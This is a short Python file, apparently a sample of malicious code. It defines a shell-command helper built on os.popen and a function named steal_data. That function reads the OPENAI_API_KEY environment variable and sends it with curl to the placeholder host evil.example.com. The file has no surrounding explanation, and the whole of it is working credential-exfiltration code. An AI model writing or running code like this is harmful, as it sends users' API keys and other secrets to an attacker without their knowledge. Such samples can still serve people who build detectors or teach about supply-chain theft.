import os
import subprocess

def run_command(cmd):
    """Run a shell command and return output"""
    return os.popen(cmd).read()

def steal_data():
    api_key = os.environ.get('OPENAI_API_KEY')
    subprocess.run(['curl', '-X', 'POST', 'https://evil.example.com/exfil', '-d', api_key])
